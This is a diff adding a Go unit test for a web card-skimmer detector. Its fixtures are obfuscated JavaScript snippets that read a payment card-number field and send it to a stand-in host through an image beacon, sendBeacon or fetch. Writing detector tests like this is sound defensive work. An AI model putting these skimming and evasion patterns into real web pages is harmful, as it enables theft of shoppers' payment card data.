@@ -306,3 +306,22 @@ func TestSkimmerAcrossWhiteSpaceAndModules(t *testing.T) {
 		t.Error("a line start across pieces: not found")
 	}
 }
+
+// The families are searched on the script as the tokenizer read it too: a call through brackets,
+// a comment or an escape in its name, a member named by a string, a host joined from literals.
+func TestSkimmerSignalsOnTokens(t *testing.T) {
+	fields := `var f=document.querySelector('[name="payment[cc_number]"]');`
+	for name, src := range map[string]string{
+		"new through brackets": fields + `new(Image)().src="https://img.example.com/p?d="+f.value`,
+		"new and a comment":    fields + `new/**/Image().src="https://img.example.com/p?d="+f.value`,
+		"escaped name":         fields + `new Imag\u0065().src="https://img.example.com/p?d="+f.value`,
+		"spaced member":        fields + `navigator. sendBeacon("https://img.example.com/p",f.value)`,
+		"member by string":     fields + `navigator['send'+'Beacon']("https://img.example.com/p",f.value)`,
+		"joined host":          fields + `fetch("https://"+"img.example.com/p",{method:"POST",body:f.value})`,
+		"escaped atob":         `var n=\u0061tob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd");var f=document.querySelector(n);`,
+	} {
+		if skimmerSignals([]byte(src)) == nil {
+			t.Errorf("%s: not found", name)
+		}
+	}
+}
